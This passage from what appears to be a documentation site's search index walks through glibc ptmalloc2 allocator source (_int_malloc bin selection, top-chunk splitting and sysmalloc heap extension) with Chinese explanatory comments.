BINMAPSHIFT) - 1)))) // \u5c06idx\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u8bbe\u7f6e\u4e3a1\uff0c\u5176\u5b83\u4f4d\u4e3a0 bit = idx2bit(idx); for (;;) {","title":"\u5bfb\u627e\u8f83\u5927 chunk"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#map","text":"/* Skip rest of block if there are no more set bits in this block. */ // \u5982\u679cbit>map\uff0c\u5219\u8868\u793a\u8be5 map \u4e2d\u6ca1\u6709\u6bd4\u5f53\u524d\u6240\u9700\u8981chunk\u5927\u7684\u7a7a\u95f2\u5757 // \u5982\u679cbit\u4e3a0\uff0c\u90a3\u4e48\u8bf4\u660e\uff0c\u4e0a\u9762idx2bit\u5e26\u5165\u7684\u53c2\u6570\u4e3a0\u3002 if (bit > map || bit == 0) { do { // \u5bfb\u627e\u4e0b\u4e00\u4e2ablock\uff0c\u76f4\u5230\u5176\u5bf9\u5e94\u7684map\u4e0d\u4e3a0\u3002 // \u5982\u679c\u5df2\u7ecf\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u90a3\u5c31\u53ea\u80fd\u4f7f\u7528top chunk\u4e86 if (++block >= BINMAPSIZE) /* out of bins */ goto use_top; } while ((map = av->binmap[ block ]) == 0); // \u83b7\u53d6\u5176\u5bf9\u5e94\u7684bin\uff0c\u56e0\u4e3a\u8be5map\u4e2d\u7684chunk\u5927\u5c0f\u90fd\u6bd4\u6240\u9700\u7684chunk\u5927\uff0c\u800c\u4e14 // map\u672c\u8eab\u4e0d\u4e3a0\uff0c\u6240\u4ee5\u5fc5\u7136\u5b58\u5728\u6ee1\u8db3\u9700\u6c42\u7684chunk\u3002 bin = bin_at(av, (block << BINMAPSHIFT)); bit = 1; }","title":"\u627e\u5230\u4e00\u4e2a\u5408\u9002\u7684 MAP"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#bin","text":"/* Advance to bin with set bit. There must be one. */ // \u4ece\u5f53\u524dmap\u7684\u6700\u5c0f\u7684bin\u4e00\u76f4\u627e\uff0c\u76f4\u5230\u627e\u5230\u5408\u9002\u7684bin\u3002 // \u8fd9\u91cc\u662f\u4e00\u5b9a\u5b58\u5728\u7684 while ((bit & map) == 0) { bin = next_bin(bin); bit <<= 1; assert(bit != 0); }","title":"\u627e\u5230\u5408\u9002\u7684 BIN"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#chunk_1","text":"/* Inspect the bin. It is likely to be non-empty */ // \u83b7\u53d6\u5bf9\u5e94\u7684bin victim = last(bin); /* If a false alarm (empty bin), clear the bit. */ // \u5982\u679cvictim=bin\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5c06map\u5bf9\u5e94\u7684\u4f4d\u6e050\uff0c\u7136\u540e\u83b7\u53d6\u4e0b\u4e00\u4e2abin // \u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u7684\u6982\u7387\u5e94\u8be5\u5f88\u5c0f\u3002 if (victim == bin) { av->binmap[ block ] = map &= ~bit; /* Write through */ bin = next_bin(bin); bit <<= 1; }","title":"\u7b80\u5355\u68c0\u67e5 CHUNK"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#chunk_2","text":"else { // \u83b7\u53d6\u5bf9\u5e94victim\u7684\u5927\u5c0f size = chunksize(victim); /* We know the first chunk in this bin is big enough to use. */ assert((unsigned long) (size) >= (unsigned long) (nb)); // \u8ba1\u7b97\u5206\u5272\u540e\u5269\u4f59\u7684\u5927\u5c0f remainder_size = size - nb; /* unlink */ unlink(av, victim, bck, fwd); /* Exhaust */ // \u5982\u679c\u5206\u5272\u540e\u4e0d\u591f\u4e00\u4e2achunk\u600e\u4e48\u529e\uff1f if (remainder_size < MINSIZE) { set_inuse_bit_at_offset(victim, size); if (av != &main_arena) set_non_main_arena(victim); } /* Split */ // \u5982\u679c\u591f\uff0c\u5c3d\u7ba1\u5206\u5272 else { // \u8ba1\u7b97\u5269\u4f59\u7684chunk\u7684\u504f\u79fb remainder = chunk_at_offset(victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // \u5c06\u5269\u4f59\u7684chunk\u63d2\u5165\u5230unsorted bin\u4e2d bck = unsorted_chunks(av); fwd = bck->fd; if (__glibc_unlikely(fwd->bk != bck)) { errstr = \"malloc(): corrupted unsorted chunks 2\"; goto errout; } remainder->bk = bck; remainder->fd = fwd; bck->fd = remainder; fwd->bk = remainder; /* advertise as last remainder */ // \u5982\u679c\u5728small bin\u8303\u56f4\u5185\uff0c\u5c31\u5c06\u5176\u6807\u8bb0\u4e3aremainder if (in_smallbin_range(nb)) av->last_remainder = remainder; if (!in_smallbin_range(remainder_size)) { remainder->fd_nextsize = NULL; remainder->bk_nextsize = NULL; } // \u8bbe\u7f6evictim\u7684\u4f7f\u7528\u72b6\u6001 set_head(victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); // \u8bbe\u7f6eremainder\u7684\u4f7f\u7528\u72b6\u6001\uff0c\u8fd9\u91cc\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f set_head(remainder, remainder_size | PREV_INUSE); // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f set_foot(remainder, remainder_size); } // \u68c0\u67e5 check_malloced_chunk(av, victim, nb); // chunk\u72b6\u6001\u8f6c\u6362\u5230mem\u72b6\u6001 void *p = chunk2mem(victim); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb(p, bytes); return p; }","title":"\u771f\u6b63\u53d6\u51fa CHUNK"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#top-chunk","text":"\u5982\u679c\u6240\u6709\u7684 bin \u4e2d\u7684 chunk \u90fd\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u6ee1\u8db3\u8981\u6c42\uff08\u5373\u4e0d\u5408\u5e76\uff09\uff0c\u6216\u8005\u8bf4\u90fd\u6ca1\u6709\u7a7a\u95f2\u7684 chunk\u3002 \u90a3\u4e48\u6211\u4eec\u5c31\u53ea\u80fd\u4f7f\u7528 top chunk \u4e86\u3002 use_top: /* If large enough, split off the chunk bordering the end of memory (held in av->top). Note that this is in accord with the best-fit search rule. In effect, av->top is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av->top always exists (i.e., has size >= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ // \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f victim = av->top; size = chunksize(victim); // \u5982\u679c\u5206\u5272\u4e4b\u540e\uff0ctop chunk \u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002 if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); av->top = remainder; // \u8fd9\u91cc\u8bbe\u7f6e PREV_INUSE \u662f\u56e0\u4e3a top chunk \u524d\u9762\u7684 chunk \u5982\u679c\u4e0d\u662f fastbin\uff0c\u5c31\u5fc5\u7136\u4f1a\u548c // top chunk \u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u8bbe\u7f6e\u4e86 PREV_INUSE\u3002 set_head(victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; } // \u5426\u5219\uff0c\u5224\u65ad\u662f\u5426\u6709 fast chunk /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if (have_fastchunks(av)) { // \u5148\u6267\u884c\u4e00\u6b21fast bin\u7684\u5408\u5e76 malloc_consolidate(av); /* restore original bin index */ // \u5224\u65ad\u9700\u8981\u7684chunk\u662f\u5728small bin\u8303\u56f4\u5185\u8fd8\u662flarge bin\u8303\u56f4\u5185 // \u5e76\u8ba1\u7b97\u5bf9\u5e94\u7684\u7d22\u5f15 // \u7b49\u5f85\u4e0b\u6b21\u518d\u770b\u770b\u662f\u5426\u53ef\u4ee5 if (in_smallbin_range(nb)) idx = smallbin_index(nb); else idx = largebin_index(nb); }","title":"\u4f7f\u7528 top chunk"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_6","text":"\u5982\u679c\u5806\u5185\u5b58\u4e0d\u591f\uff0c\u6211\u4eec\u5c31\u9700\u8981\u4f7f\u7528 sysmalloc \u6765\u7533\u8bf7\u5185\u5b58\u4e86\u3002 /* Otherwise, relay to handle system-dependent cases */ // \u5426\u5219\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ea\u80fd\u4ece\u7cfb\u7edf\u4e2d\u518d\u6b21\u7533\u8bf7\u4e00\u70b9\u5185\u5b58\u4e86\u3002 else { void *p = sysmalloc(nb, av); if (p != NULL) alloc_perturb(p, bytes); return p; }","title":"\u5806\u5185\u5b58\u4e0d\u591f"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_libc_calloc","text":"calloc \u4e5f\u662f libc \u4e2d\u7684\u4e00\u79cd\u7533\u8bf7\u5185\u5b58\u5757\u7684\u51fd\u6570\u3002\u5728 libc \u4e2d\u7684\u5c01\u88c5\u4e3a _libc_calloc \uff0c\u5177\u4f53\u4ecb\u7ecd\u5982\u4e0b /* calloc(size_t n_elements, size_t element_size); Returns a pointer to n_elements * element_size bytes, with all locations set to zero. */ void* __libc_calloc(size_t, size_t); 2020.07.08 \u4e0b\u9762\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u672a\u4ed4\u7ec6\u54c1\u5473","title":"_libc_calloc"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#sysmalloc","text":"\u6b63\u5982\u8be5\u51fd\u6570\u5934\u7684\u6ce8\u91ca\u6240\u8a00\uff0c\u8be5\u51fd\u6570\u7528\u4e8e\u5f53\u524d\u5806\u5185\u5b58\u4e0d\u8db3\u65f6\uff0c\u9700\u8981\u5411\u7cfb\u7edf\u7533\u8bf7\u66f4\u591a\u7684\u5185\u5b58\u3002 /* sysmalloc handles malloc cases requiring more memory from the system. On entry, it is assumed that av->top does not have enough space to service request for nb bytes, thus requiring that av->top be extended or replaced. */","title":"sysmalloc"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_7","text":"static void *sysmalloc(INTERNAL_SIZE_T nb, mstate av) { mchunkptr old_top; /* incoming value of av->top */ INTERNAL_SIZE_T old_size; /* its size */ char *old_end; /* its end address */ long size; /* arg to first MORECORE or mmap call */ char *brk; /* return value from MORECORE */ long correction; /* arg to 2nd MORECORE call */ char *snd_brk; /* 2nd return val */ INTERNAL_SIZE_T front_misalign; /* unusable bytes at front of new space */ INTERNAL_SIZE_T end_misalign; /* partial page left at end of new space */ char *aligned_brk; /* aligned offset into brk */ mchunkptr p; /* the allocated/returned chunk */ mchunkptr remainder; /* remainder frOm allocation */ unsigned long remainder_size; /* its size */ size_t pagesize = GLRO(dl_pagesize); bool tried_mmap = false; \u6211\u4eec\u53ef\u4ee5\u4e3b\u8981\u5173\u6ce8\u4e00\u4e0b pagesize \uff0c\u5176 #ifndef EXEC_PAGESIZE #define EXEC_PAGESIZE 4096 #endif # define GLRO(name) _##name size_t _dl_pagesize = EXEC_PAGESIZE; \u6240\u4ee5\uff0c pagesize=4096=0x1000 \u3002","title":"\u57fa\u672c\u5b9a\u4e49"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#mmap","text":"\u6b63\u5982\u5f00\u5934\u6ce8\u91ca\u6240\u8a00\u5982\u679c\u6ee1\u8db3\u5982\u4e0b\u4efb\u4f55\u4e00\u79cd\u6761\u4ef6 \u6ca1\u6709\u5206\u914d\u5806\u3002 \u7533\u8bf7\u7684\u5185\u5b58\u5927\u4e8e mp_.mmap_threshold \uff0c\u5e76\u4e14 mmap \u7684\u6570\u91cf\u5c0f\u4e8e\u6700\u5927\u503c\uff0c\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528 mmap\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e34\u754c\u503c\u4e3a static struct malloc_par mp_ = { .top_pad = DEFAULT_TOP_PAD, .n_mmaps_max = DEFAULT_MMAP_MAX, .mmap_threshold = DEFAULT_MMAP_THRESHOLD, .trim_threshold = DEFAULT_TRIM_THRESHOLD, #define NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8)) .arena_test = NARENAS_FROM_NCORES(1) #if USE_TCACHE , .tcache_count = TCACHE_FILL_COUNT, .tcache_bins = TCACHE_MAX_BINS, .tcache_max_bytes = tidx2usize(TCACHE_MAX_BINS - 1), .tcache_unsorted_limit = 0 /* No limit. */ #endif }; DEFAULT_MMAP_THRESHOLD \u4e3a 128*1024 \u5b57\u8282\uff0c\u5373 128 K\u3002 #ifndef DEFAULT_MMAP_THRESHOLD #define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN #endif /* MMAP_THRESHOLD_MAX and _MIN are the bounds on the dynamically adjusted MMAP_THRESHOLD. */ #ifndef DEFAULT_MMAP_THRESHOLD_MIN #define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024) #endif #ifndef DEFAULT_MMAP_THRESHOLD_MAX /* For 32-bit platforms we cannot increase the maximum mmap threshold much because it is also the minimum value for the maximum heap size and its alignment. Going above 512k (i.e., 1M for new heaps) wastes too much address space. */ #if __WORDSIZE == 32 #define DEFAULT_MMAP_THRESHOLD_MAX (512 * 1024) #else #define DEFAULT_MMAP_THRESHOLD_MAX (4 * 1024 * 1024 * sizeof(long)) #endif #endif \u4e0b\u9762\u4e3a\u8fd9\u90e8\u5206\u4ee3\u7801\uff0c\u76ee\u524d\u4e0d\u662f\u6211\u4eec\u5173\u5fc3\u7684\u91cd\u70b9\uff0c\u53ef\u4ee5\u6682\u65f6\u8df3\u8fc7\u3002 /* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */ if (av == NULL || ((unsigned long)(nb) >= (unsigned long)(mp_.mmap_threshold) && (mp_.n_mmaps < mp_.n_mmaps_max))) { char *mm; /* return value from mmap call*/ try_mmap: /* Round up size to nearest page. For mmapped chunks, the overhead is one SIZE_SZ unit larger than for normal chunks, because there is no following chunk whose prev_size field could be used. See the front_misalign handling below, for glibc there is no need for further alignments unless we have have high alignment. */ if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) size = ALIGN_UP(nb + SIZE_SZ, pagesize); else size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize); tried_mmap = true; /* Don't try if size wraps around 0 */ if ((unsigned long)(size) > (unsigned long)(nb)) { mm = (char *)(MMAP(0, size, PROT_READ | PROT_WRITE, 0)); if (mm != MAP_FAILED) { /* The offset to the start of the mmapped region is stored in the prev_size field of the chunk. This allows us to adjust returned start address to meet alignment requirements here and in memalign(), and still be able to compute proper address argument for later munmap in free() and realloc(). */ if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) { /* For glibc, chunk2mem increases the address by 2*SIZE_SZ and MALLOC_ALIGN_MASK is 2*SIZE_SZ-1. Each mmap'ed area is page aligned and therefore definitely MALLOC_ALIGN_MASK-aligned. */ assert(((INTERNAL_SIZE_T)chunk2mem(mm) & MALLOC_ALIGN_MASK) == 0); front_misalign = 0; } else front_misalign = (INTERNAL_SIZE_T)chunk2mem(mm) & MALLOC_ALIGN_MASK; if (front_misalign > 0) { correction = MALLOC_ALIGNMENT - front_misalign; p = (mchunkptr)(mm + correction); set_prev_size(p, correction); set_head(p, (size - correction) | IS_MMAPPED); } else { p = (mchunkptr)mm; set_prev_size(p, 0); set_head(p, size | IS_MMAPPED); } /* update statistics */ int new = atomic_exchange_and_add(&mp_.n_mmaps, 1) + 1; atomic_max(&mp_.max_n_mmaps, new); unsigned long sum; sum = atomic_exchange_and_add(&mp_.mmapped_mem, size) + size; atomic_max(&mp_.max_mmapped_mem, sum); check_chunk(av, p); return chunk2mem(p); } } }","title":"\u8003\u8651 mmap"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#mmap_1","text":"/* There are no usable arenas and mmap also failed. */ if (av == NULL) return 0; \u5982\u679c\u662f\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e2d\u7684\u4efb\u4f55\u4e00\u79cd\uff0c\u5176\u5b9e\u5c31\u53ef\u4ee5\u9000\u51fa\u4e86\u3002\u3002","title":"mmap \u5931\u8d25\u6216\u8005\u672a\u5206\u914d\u5806"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_8","text":"/* Record incoming configuration of top */ old_top = av->top; old_size = chunksize(old_top); old_end = (char *)(chunk_at_offset(old_top, old_size)); brk = snd_brk = (char *)(MORECORE_FAILURE);","title":"\u8bb0\u5f55\u65e7\u5806\u4fe1\u606f"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#1","text":"/* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */ assert((old_top == initial_top(av) && old_size == 0) || ((unsigned long)(old_size) >= MINSIZE && prev_inuse(old_top) && ((unsigned long)old_end & (pagesize - 1)) == 0)); \u8fd9\u4e2a\u68c0\u67e5\u8981\u6c42\u6ee1\u8db3\u5176\u4e2d\u4efb\u4f55\u4e00\u4e2a\u6761\u4ef6 old_top == initial_top(av) && old_size == 0 \uff0c\u5373\u5982\u679c\u662f\u7b2c\u4e00\u6b21\u7684\u8bdd\uff0c\u5806\u7684\u5927\u5c0f\u9700\u8981\u662f 0\u3002 \u65b0\u7684\u5806\uff0c\u90a3\u4e48 (unsigned long)(old_size) >= MINSIZE && prev_inuse(old_top) \uff0c\u5806\u7684\u5927\u5c0f\u5e94\u8be5\u4e0d\u5c0f\u4e8e MINSIZE \uff0c\u5e76\u4e14\u524d\u4e00\u4e2a\u5806\u5757\u5e94\u8be5\u5904\u4e8e\u4f7f\u7528\u4e2d\u3002 ((unsigned long)old_end & (pagesize - 1)) == 0) \uff0c\u5806\u7684\u7ed3\u675f\u5730\u5740\u5e94\u8be5\u662f\u9875\u5bf9\u9f50\u7684\uff0c\u7531\u4e8e\u9875\u5bf9\u9f50\u7684\u5927\u5c0f\u9ed8\u8ba4\u662f 0x1000\uff0c\u6240\u4ee5\u4f4e 12 \u4e2a\u6bd4\u7279\u9700\u8981\u4e3a 0\u3002","title":"\u68c0\u67e5\u65e7\u5806\u4fe1\u606f 1"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#2","text":"/* Precondition: not enough current space to satisfy nb request */ assert((unsigned long)(old_size) < (unsigned long)(nb + MINSIZE)); \u6839\u636e malloc \u4e2d\u7684\u5b9a\u4e49 static void *_int_malloc(mstate av, size_t bytes) { INTERNAL_SIZE_T nb; /* normalized request size */ nb \u5e94\u8be5\u662f\u5df2\u7ecf\u52a0\u4e0a chunk \u5934\u90e8\u7684\u5b57\u8282\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u8981\u52a0\u4e0a MINSIZE \u5462\uff1f\u8fd9\u662f\u56e0\u4e3a top chunk \u7684\u5927\u5c0f\u5e94\u8be5\u81f3\u5c11\u9884\u7559 MINSIZE \u7a7a\u95f4\uff0c\u4ee5\u4fbf\u4e8e\u5408\u5e76\u3002","title":"\u68c0\u67e5\u65e7\u5806\u4fe1\u606f 2"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#main_arena","text":"\u8fd9\u91cc\u6682\u65f6\u4e0d\u662f\u5173\u5fc3\u7684\u91cd\u70b9\uff0c\u6682\u4e14\u4e0d\u5206\u6790\u3002 if (av != &main_arena) { heap_info *old_heap, *heap; size_t old_heap_size; /* First try to extend the current heap. */ old_heap = heap_for_ptr(old_top); old_heap_size = old_heap->size; if ((long)(MINSIZE + nb - old_size) > 0 && grow_heap(old_heap, MINSIZE + nb - old_size) == 0) { av->system_mem += old_heap->size - old_heap_size; set_head(old_top, (((char *)old_heap + old_heap->size) - (char *)old_top) | PREV_INUSE); } else if ((heap = new_heap(nb + (MINSIZE + sizeof(*heap)), mp_.top_pad))) { /* Use a newly allocated heap. */ heap->ar_ptr = av; heap->prev = old_heap; av->system_mem += heap->size; /* Set up the new top. */ top(av) = chunk_at_offset(heap, sizeof(*heap)); set_head(top(av), (heap->size - sizeof(*heap)) | PREV_INUSE); /* Setup fencepost and free the old top chunk with a multiple of MALLOC_ALIGNMENT in size. */ /* The fencepost takes at least MINSIZE bytes, because it might become the top chunk again later. Note that a footer is set up, too, although the chunk is marked in use. */ old_size = (old_size - MINSIZE) & ~MALLOC_ALIGN_MASK; set_head(chunk_at_offset(old_top, old_size + 2 * SIZE_SZ), 0 | PREV_INUSE); if (old_size >= MINSIZE) { set_head(chunk_at_offset(old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE); set_foot(chunk_at_offset(old_top, old_size), (2 * SIZE_SZ)); set_head(old_top, old_size | PREV_INUSE | NON_MAIN_ARENA); _int_free(av, old_top, 1); } else { set_head(old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE); set_foot(old_top, (old_size + 2 * SIZE_SZ)); } } else if (!tried_mmap) /* We can at least try to use to mmap memory. */ goto try_mmap; }","title":"\u975e main_arena"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#main_arena_1","text":"","title":"Main_arena \u5904\u7406"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_9","text":"\u8ba1\u7b97\u53ef\u4ee5\u6ee1\u8db3\u8bf7\u6c42\u7684\u5185\u5b58\u5927\u5c0f\u3002 else { /* av == main_arena */ /* Request enough space for nb + pad + overhead */ size = nb + mp_.top_pad + MINSIZE; \u9ed8\u8ba4\u60c5\u51b5\u4e0b top_pad \u5b9a\u4e49\u4e3a #ifndef DEFAULT_TOP_PAD # define DEFAULT_TOP_PAD 131072 #endif \u5373 131072 \u5b57\u8282\uff0c0x20000 \u5b57\u8282\u3002","title":"\u8ba1\u7b97\u5185\u5b58"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_10","text":"\u5982\u679c\u6211\u4eec\u5e0c\u671b\u5806\u7684\u7a7a\u95f4\u8fde\u7eed\u7684\u8bdd\uff0c\u90a3\u4e48\u5176\u5b9e\u53ef\u4ee5\u590d\u7528\u4e4b\u524d\u7684\u5185\u5b58\u3002 /* If contiguous, we can subtract out existing space that we hope to combine with new space. We add it back later only if we don't actually get contiguous space. */ if (contiguous(av)) size -= old_size;","title":"\u662f\u5426\u8fde\u7eed"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_11","text":"/* Round to a multiple of page size. If MORECORE is not contiguous, this ensures that we only call it with whole-page arguments. And if MORECORE is contiguous and this is not first time through, this preserves page-alignment of previous calls. Otherwise, we correct to page-align below. */ size = ALIGN_UP(size, pagesize);","title":"\u5bf9\u9f50\u9875\u5927\u5c0f"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_12","text":"/* Don't try to call MORECORE if argument is so big as to appear negative. Note that since mmap takes size_t arg, it may succeed below even if we cannot call MORECORE. */ if (size > 0) { brk = (char *)(MORECORE(size)); LIBC_PROBE(memory_sbrk_more, 2, brk, size); }","title":"\u7533\u8bf7\u5185\u5b58"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_13","text":"if (brk != (char *)(MORECORE_FAILURE)) { /* Call the `morecore' hook if necessary. */ void (*hook)(void) = atomic_forced_read(__after_morecore_hook); if (__builtin_expect(hook != NULL, 0)) (*hook)(); } \u8fd9\u91cc\u7adf\u7136\u8c03\u7528\u4e86\u4e00\u4e2a hook\uff0c\u6709\u70b9\u610f\u601d\u3002","title":"\u53ef\u80fd\u6210\u529f"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_14","text":"\u5931\u8d25\uff0c\u8003\u8651 mmap\u3002 else { /* If have mmap, try using it as a backup when MORECORE fails or cannot be used. This is worth doing on systems that have \"holes\" in address space, so sbrk cannot extend to give contiguous space, but space is available elsewhere. Note that we ignore mmap max count and threshold limits, since the space will not be used as a segregated mmap region. */ /* Cannot merge with old top, so add its size back in */ if (contiguous(av)) size = ALIGN_UP(size + old_size, pagesize); /* If we are relying on mmap as backup, then use larger units */ if ((unsigned long)(size) < (unsigned long)(MMAP_AS_MORECORE_SIZE)) size = MMAP_AS_MORECORE_SIZE; /* Don't try if size wraps around 0 */ if ((unsigned long)(size) > (unsigned long)(nb)) { char *mbrk = (char *)(MMAP(0, size, PROT_READ | PROT_WRITE, 0)); if (mbrk != MAP_FAILED) { /* We do not need, and cannot use, another sbrk call to find end */ brk = mbrk; snd_brk = brk + size; /* Record that we no longer have a contiguous sbrk region. After the first time mmap is used as backup, we do not ever rely on contiguous space since this could incorrectly bridge regions. */ set_noncontiguous(av); } } }","title":"\u5931\u8d25"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_15","text":"if (brk != (char *)(MORECORE_FAILURE)) { if (mp_.sbrk_base == 0) mp_.sbrk_base = brk; av->system_mem += size;","title":"\u5185\u5b58\u53ef\u80fd\u7533\u8bf7\u6210\u529f"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#1_1","text":"/* If MORECORE extends previous space, we can likewise extend top size. */ if (brk == old_end && snd_brk == (char *)(MORECORE_FAILURE)) set_head(old_top, (size + old_size) | PREV_INUSE);","title":"\u60c5\u51b5 1"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#2-","text":"else if (contiguous(av) && old_size && brk < old_end) /* Oops! Someone else killed our space.. Can't touch anything. */ malloc_printerr(\"break adjusted to free malloc space\");","title":"\u60c5\u51b5 2 - \u610f\u5916\u5185\u5b58\u8017\u5c3d"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_16","text":"/* Otherwise, make adjustments: * If the first time through or noncontiguous, we need to call sbrk just to find out where the end of memory lies. * We need to ensure that all returned chunks from malloc will meet MALLOC_ALIGNMENT * If there was an intervening foreign sbrk, we need to adjust sbrk request size to account for fact that we will not be able to combine new space with existing space in old_top. * Almost all systems internally allocate whole pages at a time, in which case we might as well use the whole last page of request. So we allocate enough more memory to hit a page boundary now, which in turn causes future contiguous calls to page-align. */ else { front_misalign = 0; end_misalign = 0; correction = 0; aligned_brk = brk;","title":"\u5904\u7406\u5176\u4ed6\u610f\u5916\u60c5\u51b5"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_17","text":"/* handle contiguous cases */ if (contiguous(av)) { /* Count foreign sbrk as system_mem. */ if (old_size) av->system_mem += brk - old_end; /* Guarantee alignment of first new chunk made from this space */ front_misalign = (INTERNAL_SIZE_T)chunk2mem(brk) & MALLOC_ALIGN_MASK; if (front_misalign > 0) { /* Skip over some bytes to arrive at an aligned position. We don't need to specially mark these wasted front bytes. They will never be accessed anyway because prev_inuse of av->top (and any chunk created from its start) is always true after initialization. */ correction = MALLOC_ALIGNMENT - front_misalign; aligned_brk += correction; } /* If this isn't adjacent to existing space, then we will not be able to merge with old_top space, so must add to 2nd request. */ correction += old_size; /* Extend the end address to hit a page boundary */ end_misalign = (INTERNAL_SIZE_T)(brk + size + correction); correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign; assert(correction >= 0); snd_brk = (char *)(MORECORE(correction)); /* If can't allocate correction, try to at least find out current brk. It might be enough to proceed without failing. Note that if second sbrk did NOT fail, we assume that space is contiguous with first sbrk. This is a safe assumption unless program is multithreaded but doesn't use locks and a foreign sbrk occurred between our first and second calls. */ if (snd_brk == (char *)(MORECORE_FAILURE)) { correction = 0; snd_brk = (char *)(MORECORE(0)); } else { /* Call the `morecore' hook if necessary. */ void (*hook)(void) = atomic_forced_read(__after_morecore_hook); if (__builtin_expect(hook != NULL, 0)) (*hook)(); } }","title":"\u5904\u7406\u8fde\u7eed\u5185\u5b58"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_18","text":"/* handle non-contiguous cases */ else { if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) /* MORECORE/mmap must correctly align */ assert(((unsigned long)chunk2mem(brk) & MALLOC_ALIGN_MASK) == 0); else { front_misalign = (INTERNAL_SIZE_T)chunk2mem(brk) & MALLOC_ALIGN_MASK; if (front_misalign > 0) { /* Skip over some bytes to arrive at an aligned position. We don't need to specially mark these wasted front bytes. They will never be accessed anyway because prev_inuse of av->top (and any chunk created from its start) is always true after initialization. */ aligned_brk += MALLOC_ALIGNMENT - front_misalign; } } /* Find out current end of memory */ if (snd_brk == (char *)(MORECORE_FAILURE)) { snd_brk = (char *)(MORECORE(0)); } }","title":"\u5904\u7406\u4e0d\u8fde\u7eed\u5185\u5b58"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_19","text":"/* Adjust top based on results of second sbrk */ if (snd_brk != (char *)(MORECORE_FAILURE)) { av->top = (mchunkptr)aligned_brk; set_head(av->top, (snd_brk - aligned_brk + correction) | PREV_INUSE); av->system_mem += correction; /* If not the first time through, we either have a gap due to foreign sbrk or a non-contiguous region. Insert a double fencepost at old_top to prevent consolidation with space we don't own. These fenceposts are artificial chunks that are marked as inuse and are in any case too small to use. We need two to make sizes and alignments work out. */ if (old_size != 0) { /* 